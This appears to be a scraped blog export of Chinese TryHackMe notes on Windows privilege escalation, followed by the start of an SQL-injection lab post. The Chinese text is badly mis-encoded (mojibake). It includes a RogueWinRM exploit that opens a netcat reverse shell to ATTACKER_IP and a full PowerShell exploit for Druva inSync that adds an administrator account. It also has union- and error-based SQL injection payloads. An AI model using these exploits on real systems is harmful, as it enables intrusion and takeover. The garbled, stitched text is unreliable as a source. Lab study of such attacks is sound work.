å¯¹äºæ“ä½œç³»ç»Ÿï¼Œæ‰€æœ‰æ–‡ä»¶å‡ç”±ç”¨æˆ· ftp è®¿é—®ï¼Œä¸å½“å‰ç™»å½• FTP æœåŠ¡çš„ç”¨æˆ·æ— å…³ã€‚è¿™ä½¿å¾—æ— æ³•å°†æˆæƒå§”æ‰˜ç»™æ“ä½œç³»ç»Ÿï¼›å› æ­¤ï¼ŒFTPæœåŠ¡å¿…é¡»å®ç°å®ƒã€‚ - å¦‚æœ FTP æœåŠ¡åœ¨æŸä¸ªæ—¶åˆ»é­åˆ°ç ´åï¼Œæ”»å‡»è€…å°†ç«‹å³è·å¾—å¯¹ ftp ç”¨æˆ·æœ‰æƒè®¿é—®çš„æ‰€æœ‰æ–‡ä»¶å¤¹çš„è®¿é—®æƒé™ã€‚ å¦ä¸€æ–¹é¢ï¼Œå¦‚æœ FTP æœåŠ¡çš„ç”¨æˆ·å…·æœ‰ SeImpersonate æˆ– SeAssignPrimaryToken æƒé™ï¼Œåˆ™æ‰€æœ‰è¿™äº›éƒ½ä¼šç¨å¾®ç®€åŒ–ï¼Œå› ä¸º FTP æœåŠ¡å¯ä»¥ä¸´æ—¶è·å–ç™»å½•ç”¨æˆ·çš„è®¿é—®ä»¤ç‰Œï¼Œå¹¶ä½¿ç”¨å®ƒæ¥æ‰§è¡Œå…¶ä¸Šçš„ä»»ä½•ä»»åŠ¡ã€‚ä»£è¡¨ï¼š ç°åœ¨ï¼Œå¦‚æœç”¨æˆ· Ann ç™»å½•åˆ° FTP æœåŠ¡ï¼Œå¹¶ä¸”è€ƒè™‘åˆ° ftp ç”¨æˆ·å…·æœ‰æ¨¡æ‹Ÿæƒé™ï¼Œåˆ™å®ƒå¯ä»¥å€Ÿç”¨ Ann çš„è®¿é—®ä»¤ç‰Œå¹¶ä½¿ç”¨å®ƒæ¥è®¿é—®å¥¹çš„æ–‡ä»¶ã€‚è¿™æ ·ï¼Œæ–‡ä»¶ä¸éœ€è¦ä»¥ä»»ä½•æ–¹å¼å‘ç”¨æˆ· ftp æä¾›è®¿é—®æƒé™ï¼Œå¹¶ä¸”æ“ä½œç³»ç»Ÿä¼šå¤„ç†æˆæƒã€‚ç”±äº FTP æœåŠ¡æ­£åœ¨å†’å…… Annï¼Œå› æ­¤åœ¨è¯¥ä¼šè¯æœŸé—´å®ƒå°†æ— æ³•è®¿é—® Jude æˆ– Bill çš„æ–‡ä»¶ã€‚ ä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•æ§åˆ¶å…·æœ‰ SeImpersonate æˆ– SeAssignPrimaryToken æƒé™çš„è¿›ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ¨¡æ‹Ÿè¿æ¥è¯¥è¿›ç¨‹å¹¶å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯çš„ä»»ä½•ç”¨æˆ·ã€‚ åœ¨Windowsç³»ç»Ÿä¸­ï¼Œä½ ä¼šå‘ç°LOCAL SERVICEå’ŒNETWORK SERVICE ACCOUNTSå·²ç»æ‹¥æœ‰è¿™æ ·çš„æƒé™ã€‚ç”±äºè¿™äº›å¸æˆ·ç”¨äºä½¿ç”¨å—é™å¸æˆ·ç”ŸæˆæœåŠ¡ï¼Œå› æ­¤å¦‚æœæœåŠ¡éœ€è¦ï¼Œå…è®¸å®ƒä»¬æ¨¡æ‹Ÿè¿æ¥ç”¨æˆ·æ˜¯æœ‰æ„ä¹‰çš„ã€‚ Internet ä¿¡æ¯æœåŠ¡ (IIS) è¿˜å°†ä¸º Web åº”ç”¨ç¨‹åºåˆ›å»ºä¸€ä¸ªåä¸ºâ€œiis apppool\\defaultapppoolâ€çš„ç±»ä¼¼é»˜è®¤å¸æˆ·ã€‚ è¦ä½¿ç”¨æ­¤ç±»å¸æˆ·æå‡æƒé™ï¼Œæ”»å‡»è€…éœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š 1. ç”Ÿæˆä¸€ä¸ªè¿›ç¨‹ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥è¿æ¥è¯¥è¿›ç¨‹å¹¶å¯¹å…¶è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»¥è¿›è¡Œæ¨¡æ‹Ÿã€‚ 2.æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥å¼ºåˆ¶ç‰¹æƒç”¨æˆ·è¿æ¥å¹¶éªŒè¯ç”Ÿæˆçš„æ¶æ„è¿›ç¨‹ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨ RogueWinRM æ¼æ´æ¥å®ç°è¿™ä¸¤ä¸ªæ¡ä»¶ã€‚ é¦–å…ˆï¼Œå‡è®¾æˆ‘ä»¬å·²ç»å…¥ä¾µäº†ä¸€ä¸ªåœ¨ IIS ä¸Šè¿è¡Œçš„ç½‘ç«™ï¼Œå¹¶ä¸”æˆ‘ä»¬å·²ç»åœ¨ä»¥ä¸‹åœ°å€æ¤å…¥äº† Web shellï¼š http://MACHINE_IP/ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Web shell æ£€æŸ¥å—æ„ŸæŸ“å¸æˆ·çš„åˆ†é…æƒé™ï¼Œå¹¶ç¡®è®¤æˆ‘ä»¬æ‹¥æœ‰æ­¤ä»»åŠ¡æ„Ÿå…´è¶£çš„ä¸¤é¡¹æƒé™ï¼š è¦ä½¿ç”¨RogueWinRMï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†æ¼æ´åˆ©ç”¨ç¨‹åºä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨ã€‚ä¸ºäº†æ‚¨çš„æ–¹ä¾¿ï¼Œè¿™å·²ç»å®Œæˆï¼Œæ‚¨å¯ä»¥åœ¨ C:\\tools\\ æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°è¯¥æ¼æ´ã€‚ RogueWinRM æ¼æ´åˆ©ç”¨æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºæ¯å½“ç”¨æˆ·ï¼ˆåŒ…æ‹¬éç‰¹æƒç”¨æˆ·ï¼‰åœ¨ Windows ä¸­å¯åŠ¨ BITS æœåŠ¡æ—¶ï¼Œå®ƒéƒ½ä¼šä½¿ç”¨ç³»ç»Ÿæƒé™è‡ªåŠ¨åˆ›å»ºåˆ°ç«¯å£ 5985 çš„è¿æ¥ã€‚ç«¯å£ 5985 é€šå¸¸ç”¨äº WinRM æœåŠ¡ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªå…¬å¼€ Powershell æ§åˆ¶å°ä»¥é€šè¿‡ç½‘ç»œè¿œç¨‹ä½¿ç”¨çš„ç«¯å£ã€‚å¯ä»¥å°†å…¶æƒ³è±¡ä¸º SSHï¼Œä½†ä½¿ç”¨ Powershellã€‚ å¦‚æœç”±äºæŸç§åŸå› ï¼ŒWinRM æœåŠ¡æ²¡æœ‰åœ¨å—å®³æœåŠ¡å™¨ä¸Šè¿è¡Œï¼Œåˆ™æ”»å‡»è€…å¯ä»¥åœ¨ç«¯å£ 5985 ä¸Šå¯åŠ¨ä¼ªé€ çš„ WinRM æœåŠ¡ï¼Œå¹¶åœ¨å¯åŠ¨æ—¶æ•è· BITS æœåŠ¡è¿›è¡Œçš„èº«ä»½éªŒè¯å°è¯•ã€‚å¦‚æœæ”»å‡»è€…å…·æœ‰SeImpersonateæƒé™ï¼Œä»–å¯ä»¥ä»£è¡¨è¿æ¥ç”¨æˆ·ï¼ˆå³SYSTEMï¼‰æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚ åœ¨è¿è¡Œæ¼æ´ä¹‹å‰ï¼Œæˆ‘ä»¬å°†å¯åŠ¨ä¸€ä¸ª netcat ä¾¦å¬å™¨ä»¥åœ¨æ”»å‡»è€…çš„è®¡ç®—æœºä¸Šæ¥æ”¶åå‘ shellï¼š user@attackerpc$ nc -lvp 4442 ç„¶åï¼Œä½¿ç”¨æˆ‘ä»¬çš„ Web shell ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è§¦å‘ RogueWinRM æ¼æ´åˆ©ç”¨ï¼š c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools c64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\" æ³¨æ„ï¼šè¯¥æ¼æ´å¯èƒ½éœ€è¦é•¿è¾¾ 2 åˆ†é’Ÿæ‰èƒ½å‘æŒ¥ä½œç”¨ï¼Œå› æ­¤æ‚¨çš„æµè§ˆå™¨å¯èƒ½ä¼šå‡ºç°ä¸€æ®µæ—¶é—´æ— å“åº”ã€‚å¦‚æœæ‚¨å¤šæ¬¡è¿è¡Œæ¼æ´åˆ©ç”¨ç¨‹åºï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œå› ä¸ºå®ƒå¿…é¡»ç­‰å¾… BITS æœåŠ¡åœæ­¢æ‰èƒ½å†æ¬¡å¯åŠ¨ã€‚ BITSæœåŠ¡å°†åœ¨å¯åŠ¨2åˆ†é’Ÿåè‡ªåŠ¨åœæ­¢ã€‚ -p å‚æ•°æŒ‡å®šæ¼æ´åˆ©ç”¨ç¨‹åºè¿è¡Œçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º nc64.exe ã€‚ -a å‚æ•°ç”¨äºå°†å‚æ•°ä¼ é€’ç»™å¯æ‰§è¡Œæ–‡ä»¶ã€‚ç”±äºæˆ‘ä»¬å¸Œæœ› nc64 é’ˆå¯¹æ”»å‡»è€…æœºå™¨å»ºç«‹åå‘ shellï¼Œå› æ­¤ä¼ é€’ç»™ netcat çš„å‚æ•°å°†ä¸º -e cmd.exe ATTACKER_IP 4442 ã€‚ å¦‚æœä¸€åˆ‡è®¾ç½®æ­£ç¡®ï¼Œæ‚¨åº”è¯¥ä¼šå¾—åˆ°ä¸€ä¸ªå…·æœ‰ SYSTEM æƒé™çš„ shellï¼š user@attackerpc$ nc -lvp 4442 Listening on 0.0.0.0 4442 Connection received on 10.10.175.90 49755 Microsoft Windows [Version 10.0.17763.1821] (c) 2018 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv&gt;whoami nt authority\\system 4.10 æœªæ‰“è¡¥ä¸çš„è½¯ä»¶ ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…çš„è½¯ä»¶å¯ä»¥æä¾›å„ç§æƒé™å‡çº§æœºä¼šã€‚ä¸é©±åŠ¨ç¨‹åºä¸€æ ·ï¼Œç»„ç»‡å’Œç”¨æˆ·å¯èƒ½ä¸ä¼šåƒæ›´æ–°æ“ä½œç³»ç»Ÿé‚£æ ·é¢‘ç¹åœ°æ›´æ–°å®ƒä»¬ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ wmic å·¥å…·åˆ—å‡ºç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…çš„è½¯ä»¶åŠå…¶ç‰ˆæœ¬ã€‚ä¸‹é¢çš„å‘½ä»¤å°†è½¬å‚¨å®ƒå¯ä»¥åœ¨å·²å®‰è£…çš„è½¯ä»¶ä¸Šæ”¶é›†çš„ä¿¡æ¯ï¼ˆå¯èƒ½éœ€è¦å¤§çº¦ä¸€åˆ†é’Ÿæ‰èƒ½å®Œæˆï¼‰ï¼š wmic product get name,version,vendor Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable. è¯·è®°ä½ï¼Œ wmic product å‘½ä»¤å¯èƒ½ä¸ä¼šè¿”å›æ‰€æœ‰å·²å®‰è£…çš„ç¨‹åºã€‚æ ¹æ®æŸäº›ç¨‹åºçš„å®‰è£…æ–¹å¼ï¼Œå®ƒä»¬å¯èƒ½ä¸ä¼šåœ¨æ­¤å¤„åˆ—å‡ºã€‚æ£€æŸ¥æ¡Œé¢å¿«æ·æ–¹å¼ã€å¯ç”¨æœåŠ¡æˆ–ä»»ä½•è¡¨æ˜å­˜åœ¨å¯èƒ½æ˜“å—æ”»å‡»çš„å…¶ä»–è½¯ä»¶çš„ç—•è¿¹å§‹ç»ˆæ˜¯å€¼å¾—çš„ã€‚ ä¸€æ—¦æˆ‘ä»¬æ”¶é›†äº†äº§å“ç‰ˆæœ¬ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥éšæ—¶åœ¨ exploit-db, packet storm å’Œ Google,ç­‰ç½‘ç«™ä¸Šåœ¨çº¿æœç´¢å·²å®‰è£…è½¯ä»¶çš„ç°æœ‰æ¼æ´ã€‚ Exampleï¼šDruva inSync 6.6.3 ç›®æ ‡æœåŠ¡å™¨æ­£åœ¨è¿è¡Œ Druva inSync 6.6.3ï¼Œæ® Matteo Malvica æŠ¥å‘Šï¼Œè¯¥æœåŠ¡å™¨å®¹æ˜“å—åˆ°æƒé™å‡çº§çš„å½±å“ã€‚è¯¥æ¼æ´æ˜¯ç”±äºå¯¹ Chris Lyne æœ€åˆé’ˆå¯¹ 6.5.0 ç‰ˆæœ¬æŠ¥å‘Šçš„å¦ä¸€ä¸ªæ¼æ´åº”ç”¨äº†é”™è¯¯è¡¥ä¸è€Œå¯¼è‡´çš„ã€‚ è¯¥è½¯ä»¶å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œå› ä¸ºå®ƒä»¥ç³»ç»Ÿæƒé™åœ¨ç«¯å£ 6064 ä¸Šè¿è¡Œ RPCï¼ˆè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰æœåŠ¡å™¨ï¼Œåªèƒ½ä»æœ¬åœ°ä¸»æœºè®¿é—®ã€‚å¦‚æœæ‚¨ä¸ç†Ÿæ‚‰ RPCï¼Œå®ƒåªæ˜¯ä¸€ç§å…è®¸ç»™å®šè¿›ç¨‹é€šè¿‡ç½‘ç»œå…¬å¼€å‡½æ•°ï¼ˆRPC è¡Œè¯ä¸­ç§°ä¸ºè¿‡ç¨‹ï¼‰çš„æœºåˆ¶ï¼Œä»¥ä¾¿å…¶ä»–è®¡ç®—æœºå¯ä»¥è¿œç¨‹è°ƒç”¨å®ƒä»¬ã€‚ å¯¹äº Druva inSyncï¼Œç«¯å£ 6064 ä¸Šå…¬å¼€çš„è¿‡ç¨‹ä¹‹ä¸€ï¼ˆç‰¹åˆ«æ˜¯è¿‡ç¨‹å· 5ï¼‰å…è®¸ä»»ä½•äººè¯·æ±‚æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚ç”±äº RPC æœåŠ¡å™¨ä»¥ SYSTEM èº«ä»½è¿è¡Œï¼Œå› æ­¤ä»»ä½•å‘½ä»¤éƒ½ä»¥ SYSTEM æƒé™æ‰§è¡Œã€‚ 6.5.0 åŠæ›´æ—©ç‰ˆæœ¬ä¸­æŠ¥å‘Šçš„åŸå§‹æ¼æ´å…è®¸ä¸å—é™åˆ¶åœ°è¿è¡Œä»»ä½•å‘½ä»¤ã€‚æä¾›æ­¤ç±»åŠŸèƒ½çš„æœ€åˆæƒ³æ³•æ˜¯è¿œç¨‹æ‰§è¡Œ inSync æä¾›çš„ä¸€äº›ç‰¹å®šäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ä»»ä½•å‘½ä»¤ã€‚å°½ç®¡å¦‚æ­¤ï¼Œä»ç„¶æ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥æ¥ç¡®ä¿è¿™ä¸€ç‚¹ã€‚ å‘å¸ƒäº†ä¸€ä¸ªè¡¥ä¸ï¼Œä»–ä»¬å†³å®šæ£€æŸ¥æ‰§è¡Œçš„å‘½ä»¤æ˜¯å¦ä»¥å­—ç¬¦ä¸² C:\\ProgramData\\Druva\\inSync4\\ å¼€å¤´ï¼Œè¿™æ˜¯å…è®¸çš„äºŒè¿›åˆ¶æ–‡ä»¶åº”è¯¥åœ¨çš„åœ°æ–¹ã€‚ä½†æ˜¯ï¼Œäº‹å®è¯æ˜è¿™è¿˜ä¸å¤Ÿï¼Œå› ä¸ºæ‚¨å¯ä»¥ç®€å•åœ°è¿›è¡Œè·¯å¾„éå†æ”»å‡»æ¥ç»•è¿‡è¿™ç§æ§åˆ¶ã€‚å‡è®¾ä½ è¦æ‰§è¡Œ C:\\Windows\\System32\\cmd.exe ï¼Œå®ƒä¸åœ¨å…è®¸çš„è·¯å¾„ä¸­ï¼›æ‚¨åªéœ€è¦æ±‚æœåŠ¡å™¨è¿è¡Œ C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe å³å¯æˆåŠŸç»•è¿‡æ£€æŸ¥ã€‚ ä¸ºäº†æ„å»ºä¸€ä¸ªå¯è¡Œçš„æ¼æ´åˆ©ç”¨ç¨‹åºï¼Œæˆ‘ä»¬éœ€è¦äº†è§£å¦‚ä½•ä¸ç«¯å£ 6064 é€šä¿¡ã€‚å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„åè®®å¾ˆç®€å•ï¼Œè¦å‘é€çš„æ•°æ®åŒ…å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ç¬¬ä¸€ä¸ªæ•°æ®åŒ…åªæ˜¯ä¸€ä¸ªåŒ…å«å›ºå®šå­—ç¬¦ä¸²çš„ hello æ•°æ®åŒ…ã€‚ç¬¬äºŒä¸ªæ•°æ®åŒ…è¡¨æ˜æˆ‘ä»¬æƒ³è¦æ‰§è¡Œç¨‹åº 5ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªæ˜“å—æ”»å‡»çš„ç¨‹åºï¼Œå®ƒå°†ä¸ºæˆ‘ä»¬æ‰§è¡Œä»»ä½•å‘½ä»¤ã€‚æœ€åä¸¤ä¸ªæ•°æ®åŒ…åˆ†åˆ«ç”¨äºå‘é€å‘½ä»¤çš„é•¿åº¦å’Œè¦æ‰§è¡Œçš„å‘½ä»¤å­—ç¬¦ä¸²ã€‚ æœ€åˆç”± Matteo Malvica åœ¨æ­¤å‘å¸ƒï¼Œå¯ä»¥åœ¨ç›®æ ‡è®¡ç®—æœºä¸­ä½¿ç”¨ä»¥ä¸‹æ¼æ´æ¥æå‡æƒé™å¹¶æ£€ç´¢æ­¤ä»»åŠ¡çš„æ ‡å¿—ã€‚ä¸ºäº†æ‚¨çš„æ–¹ä¾¿ï¼Œä»¥ä¸‹æ˜¯åŸå§‹æ¼æ´åˆ©ç”¨ä»£ç ï¼š $ErrorActionPreference = \"Stop\" $cmd = \"net user pwnd /add\" $s = New-Object System.Net.Sockets.Socket( [System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp ) $s.Connect(\"127.0.0.1\", 6064) $header = [System.Text.Encoding]::UTF8.GetBytes(\"inSync PHC RPCW[v0002]\") $rpcType = [System.Text.Encoding]::UTF8.GetBytes(\"$([char]0x0005)`0`0`0\") $command = [System.Text.Encoding]::Unicode.GetBytes(\"C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd\"); $length = [System.BitConverter]::GetBytes($command.Length); $s.Send($header) $s.Send($rpcType) $s.Send($length) $s.Send($command) æ‚¨å¯ä»¥å¼¹å‡º Powershell æ§åˆ¶å°å¹¶ç›´æ¥ç²˜è´´æ¼æ´æ¥æ‰§è¡Œå®ƒï¼ˆè¯¥æ¼æ´ä¹Ÿå¯ä»¥åœ¨ç›®æ ‡è®¡ç®—æœºä¸­çš„ C:\\tools\\Druva_inSync_exploit.txt ä¸­æ‰¾åˆ°ï¼‰ã€‚è¯·æ³¨æ„ï¼Œåœ¨ $cmd å˜é‡ä¸­æŒ‡å®šçš„æ¼æ´åˆ©ç”¨çš„é»˜è®¤è´Ÿè½½å°†åœ¨ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªåä¸º pwnd çš„ç”¨æˆ·ï¼Œä½†ä¸ä¼šä¸ºå…¶åˆ†é…ç®¡ç†æƒé™ï¼Œå› æ­¤æˆ‘ä»¬å¯èƒ½æƒ³è¦æ›´æ”¹æœ‰æ•ˆè´Ÿè½½ä»¥è·å¾—æ›´æœ‰ç”¨çš„ä¸œè¥¿ã€‚å¯¹äºè¿™ä¸ªæˆ¿é—´ï¼Œæˆ‘ä»¬å°†æ›´æ”¹æœ‰æ•ˆè´Ÿè½½ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add è¿™å°†åˆ›å»ºå¯†ç ä¸º SimplePass123 çš„ç”¨æˆ· pwnd å¹¶å°†å…¶æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ä¸­ã€‚å¦‚æœåˆ©ç”¨æˆåŠŸï¼Œæ‚¨åº”è¯¥èƒ½å¤Ÿè¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥éªŒè¯ç”¨æˆ· pwnd æ˜¯å¦å­˜åœ¨å¹¶ä¸”å±äºç®¡ç†å‘˜ç»„ï¼š Command Prompt å‘½ä»¤æç¤ºç¬¦ PS C:\\&gt; net user pwnd User name pwnd Full Name Account active Yes [...] Local Group Memberships *Administrators *Users Global Group memberships *None æœ€åä¸€æ­¥ï¼Œæ‚¨å¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œå‘½ä»¤æç¤ºç¬¦ï¼š 0x05 è‡ªåŠ¨åŒ–å·¥å…· æœ‰å‡ ä¸ªè„šæœ¬å¯ä»¥ä»¥ç±»ä¼¼äºä¸Šä¸€ä¸ªä»»åŠ¡ä¸­çœ‹åˆ°çš„æ–¹å¼è¿›è¡Œç³»ç»Ÿæšä¸¾ã€‚è¿™äº›å·¥å…·å¯ä»¥ç¼©çŸ­æšä¸¾è¿‡ç¨‹æ—¶é—´å¹¶å‘ç°ä¸åŒçš„æ½œåœ¨ç‰¹æƒå‡çº§å‘é‡ã€‚ä½†æ˜¯ï¼Œè¯·è®°ä½ï¼Œè‡ªåŠ¨åŒ–å·¥å…·æœ‰æ—¶å¯èƒ½ä¼šé”™è¿‡æƒé™å‡çº§ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨äºè¯†åˆ«æƒé™å‡çº§å‘é‡çš„å·¥å…·ã€‚è¯·éšæ„é’ˆå¯¹è¿™ä¸ªæˆ¿é—´ä¸­çš„ä»»ä½•æœºå™¨è¿è¡Œå®ƒä»¬ï¼Œçœ‹çœ‹ç»“æœæ˜¯å¦ä¸è®¨è®ºçš„æ”»å‡»å‘é‡ç›¸åŒ¹é…ã€‚ 5.1 WinPEAS WinPEAS æ˜¯ä¸€ä¸ªå¼€å‘ç”¨äºæšä¸¾ç›®æ ‡ç³»ç»Ÿä»¥å‘ç°æƒé™æå‡è·¯å¾„çš„è„šæœ¬ã€‚æ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³ winPEAS çš„æ›´å¤šä¿¡æ¯å¹¶ä¸‹è½½é¢„ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶æˆ– .bat è„šæœ¬ã€‚ WinPEAS å°†è¿è¡Œä¸ä¸Šä¸€ä¸ªä»»åŠ¡ä¸­åˆ—å‡ºçš„å‘½ä»¤ç±»ä¼¼çš„å‘½ä»¤å¹¶æ‰“å°å…¶è¾“å‡ºã€‚ winPEAS çš„è¾“å‡ºå¯èƒ½å¾ˆé•¿ï¼Œæœ‰æ—¶éš¾ä»¥é˜…è¯»ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ€å¥½å§‹ç»ˆå°†è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š C:\\&gt; winpeas.exe &gt; outputfile.txt WinPEAS å¯åœ¨æ­¤å¤„ä¸‹è½½ï¼šhere 5.2 PrivescCheck PrivescCheck æ˜¯ä¸€ä¸ª PowerShell è„šæœ¬ï¼Œç”¨äºæœç´¢ç›®æ ‡ç³»ç»Ÿä¸Šçš„å¸¸è§æƒé™å‡çº§ã€‚å®ƒæä¾›äº† WinPEAS çš„æ›¿ä»£æ–¹æ¡ˆï¼Œæ— éœ€æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ PrivescCheck å¯åœ¨æ­¤å¤„ä¸‹è½½ here. æé†’ï¼šè¦åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œ PrivescCheckï¼Œæ‚¨å¯èƒ½éœ€è¦ç»•è¿‡æ‰§è¡Œç­–ç•¥é™åˆ¶ã€‚ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ Set-ExecutionPolicy cmdletï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ PS C:\\&gt; Set-ExecutionPolicy Bypass -Scope process -Force PS C:\\&gt; . .\\PrivescCheck.ps1 PS C:\\&gt; Invoke-PrivescCheck 5.3 WES-NG ä¸€äº›æ¼æ´åˆ©ç”¨å»ºè®®è„šæœ¬ï¼ˆä¾‹å¦‚ winPEASï¼‰å°†è¦æ±‚æ‚¨å°†å®ƒä»¬ä¸Šä¼ åˆ°ç›®æ ‡ç³»ç»Ÿå¹¶åœ¨é‚£é‡Œè¿è¡Œå®ƒä»¬ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´é˜²ç—…æ¯’è½¯ä»¶æ£€æµ‹å¹¶åˆ é™¤å®ƒä»¬ã€‚ä¸ºäº†é¿å…å‘å‡ºä¸å¿…è¦çš„å™ªéŸ³æ¥å¸å¼•æ³¨æ„åŠ›ï¼Œæ‚¨å¯èƒ½æ›´å–œæ¬¢ä½¿ç”¨ WES-NGï¼Œå®ƒå°†åœ¨æ‚¨çš„æ”»å‡»æœºå™¨ä¸Šè¿è¡Œï¼ˆä¾‹å¦‚ Kali æˆ– TryHackMe AttackBoxï¼‰ã€‚ WES-NG æ˜¯ä¸€ä¸ª Python è„šæœ¬ï¼Œå¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å¹¶ä¸‹è½½ã€‚ here. å®‰è£…åï¼Œåœ¨ä½¿ç”¨ä¹‹å‰ï¼Œè¯·é”®å…¥ wes.py --update å‘½ä»¤æ¥æ›´æ–°æ•°æ®åº“ã€‚è¯¥è„šæœ¬å°†å¼•ç”¨å®ƒåˆ›å»ºçš„æ•°æ®åº“æ¥æ£€æŸ¥æ˜¯å¦æœ‰ç¼ºå¤±çš„è¡¥ä¸ï¼Œè¿™äº›è¡¥ä¸å¯èƒ½ä¼šå¯¼è‡´æ‚¨å¯ä»¥åˆ©ç”¨æ¼æ´æ¥æå‡æ‚¨åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šçš„æƒé™ã€‚ è¦ä½¿ç”¨è¯¥è„šæœ¬ï¼Œæ‚¨éœ€è¦åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šè¿è¡Œ systeminfo å‘½ä»¤ã€‚ä¸è¦å¿˜è®°å°†è¾“å‡ºå®šå‘åˆ°æ‚¨éœ€è¦ç§»åŠ¨åˆ°æ”»å‡»è®¡ç®—æœºçš„ .txt æ–‡ä»¶ã€‚ å®Œæˆåï¼Œwes.py å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼è¿è¡Œï¼› user@kali$ wes.py systeminfo.txt 5.4 Metasploit å…ƒåˆ†æè½¯ä»¶ å¦‚æœç›®æ ‡ç³»ç»Ÿä¸Šå·²æœ‰ Meterpreter shellï¼Œåˆ™å¯ä»¥ä½¿ç”¨ multi/recon/local_exploit_suggester æ¨¡å—åˆ—å‡ºå¯èƒ½å½±å“ç›®æ ‡ç³»ç»Ÿçš„æ¼æ´ï¼Œå¹¶å…è®¸æ‚¨æå‡ç›®æ ‡ç³»ç»Ÿä¸Šçš„æƒé™ã€‚","tags":["TryHackMe"],"categories":["TryHackMe"]},{"title":"å¸¸è§„æ¼æ´å­¦ä¹ æ€»ç»“","path":"/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/","content":"0x01 SQLi_Lab Less-1 å…³é”®æºç å¦‚ä¸‹ï¼š &lt;?php include(\"../sql-connections/sql-connect.php\"); error_reporting(0); // take the variables if(isset($_GET['id'])) { $id=$_GET['id']; ....... $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); ....... echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; } å¯ä»¥çœ‹åˆ°è¿™é‡Œä¸ºgetç±»å‹ä¼ å‚ï¼Œä¸”ä¼ å…¥çš„idå‚æ•°æ²¡æœ‰ç»è¿‡ä»»ä½•è¿‡æ»¤ä¾¿æ’å…¥åˆ°äº†SQLè¯­å¥ä¸­ï¼Œä¸”å¯ä»¥æ¸…æ™°çœ‹åˆ°é—­åˆæ–¹å¼ä¸ºå•å¼•å·ã€‚ å¦å¤–å€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œç”¨äº†mysql_error()å‡½æ•°æ¥æ˜¾ç¤ºæ•°æ®åº“å¯èƒ½çš„æŠ¥é”™ä¿¡æ¯ã€‚ è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¿›è¡Œè”åˆã€æŠ¥é”™ã€å¸ƒå°”ã€æ—¶é—´ç›²æ³¨ã€‚ è”åˆæ³¨å…¥ ?id=-1' union select 1,group_concat(username,0x7e,password),3 from users--+ æŠ¥é”™æ³¨å…¥ ?id=1' and (select 1 from(select count(*),concat(floor(rand(0)*2),(select concat(username,0x7e,password)from users limit 0,1))a from information_schema.tables group by a)b)--+ æ‰‹åŠ¨ä¿®æ”¹limit 0,1è¿›è¡Œç»“æœåç§» 